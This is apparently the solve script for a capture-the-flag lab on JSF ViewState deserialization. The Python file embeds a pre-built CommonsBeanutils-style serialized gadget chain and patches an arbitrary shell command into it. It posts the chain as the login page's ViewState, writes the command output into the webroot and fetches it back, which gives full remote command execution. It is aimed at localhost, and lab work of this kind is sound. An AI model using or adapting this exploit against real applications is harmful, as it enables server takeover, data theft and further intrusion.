#!/usr/bin/env python3
#
# Exploit for the JSF ViewState deserialization lab (see ../README.md).
#
# Usage:
#   python3 solve.py                     read /flag.txt
#   python3 solve.py 'id'                run an arbitrary command
#   python3 solve.py --raw payload.bin   deliver a pre-built serialized payload
#
# The template below is a pre-generated CommonsBeanutils1-style chain:
#   PriorityQueue -> BeanComparator("outputProperties") -> TemplatesImpl
# It embeds a translet class whose constant pool holds a marker string, so the
# command can be swapped in place without a Java toolchain. Equivalent payload
# can be produced with ysoserial; see README.md.
#
# The command output is written under the deployed web application directory
# and read back over HTTP. The server has no outbound network access.

import base64
import gzip
import http.cookiejar
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

TARGET = "http://localhost:8080"
LOGIN = TARGET + "/pages/login.xhtml"
WEBROOT = "/usr/local/tomcat/webapps/ROOT"

TEMPLATE = (
    "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABQ3K/rq+AAAANAAtCgAKABwKAB0AHgcAHwgAIAgAIQcAIggAIwoAHQAkBwAlBwAmAQADQ01EAQASTGphdmEvbGFuZy9TdHJpbmc7AQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwAiBwAlAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApTb3VyY2VGaWxlAQANVHJhbnNsZXQuamF2YQwADgAPBwAoDAApACoBABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQAIVHJhbnNsZXQBAN5fX0NNRF9fU1RBUlRBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQV9fQ01EX19FTkQMACsALAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAoAAAABABoACwAMAAEADQAAAAIABwADAAEADgAPAAEAEAAAAGkABQACAAAAIyq3AAG4AAIGvQADWQMSBFNZBBIFU1kFEgdTtgAIV6cABEyxAAEABAAeACEACQACABEAAAAWAAUAAAAXAAQAGQAeABsAIQAaACIAHAASAAAAEAAC/wAhAAEHABMAAQcAFAAAAQAVABYAAgAQAAAAGQAAAAMAAAABsQAAAAEAEQAAAAYAAQAAAB8AFwAAAAQAAQAYAAEAFQAZAAIAEAAAABkAAAAEAAAAAbEAAAABABEAAAAGAAEAAAAiABcAAAAEAAEAGAABABoAAAACABtwdAAIVHJhbnNsZXRwdwEAeHEAfgANeA=="
)

MARKER = re.compile(rb"__CMD__START.*?__CMD__END", re.S)


def build_viewstate(script):
    raw = bytearray(base64.b64decode(TEMPLATE))
    m = MARKER.search(bytes(raw))
    if not m:
        raise SystemExit("[!] payload template is corrupted")
    span = m.end() - m.start()
    if len(script) > span:
        raise SystemExit("[!] command too long (max %d characters)" % span)
    raw[m.start():m.end()] = script.encode() + b" " * (span - len(script))
    return base64.b64encode(gzip.compress(bytes(raw))).decode()


class Session:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))
        self.opener.open(LOGIN, timeout=15).read()

    def post_viewstate(self, viewstate):
        body = "javax.faces.ViewState=" + urllib.parse.quote(viewstate, safe="") \
               + "&loginForm=loginForm"
        req = urllib.request.Request(
            LOGIN, data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            method="POST")
        try:
            return self.opener.open(req, timeout=20).status
        except urllib.error.HTTPError as e:
            return e.code

    def get(self, path):
        try:
            return self.opener.open(TARGET + path, timeout=10).read()
        except urllib.error.HTTPError:
            return None


def main():
    args = sys.argv[1:]
    outfile = None

    if args and args[0] == "--raw":
        if len(args) != 2:
            raise SystemExit("usage: solve.py --raw <serialized-payload-file>")
        viewstate = base64.b64encode(gzip.compress(open(args[1], "rb").read())).decode()
    else:
        script = " ".join(args) if args else "cat /flag.txt"
        outfile = "out-%s.txt" % uuid.uuid4().hex[:8]
        script = script + " > " + WEBROOT + "/" + outfile + " 2>&1"
        viewstate = build_viewstate(script)

    sess = Session()
    code = sess.post_viewstate(viewstate)
    print("[*] payload delivered, HTTP %s" % code)

    if outfile is None:
        sys.exit(0)

    # the shell process outlives the request that started it, poll for the output
    out = None
    for _ in range(15):
        out = sess.get("/" + outfile)
        if out is not None:
            break
        time.sleep(0.4)

    print("-" * 46)
    if out:
        sys.stdout.write(out.decode("utf-8", "replace"))
        if not out.endswith(b"\n"):
            print()
    else:
        print("[!] no output at /%s - the command did not produce anything" % outfile)
    print("-" * 46)


if __name__ == "__main__":
    main()
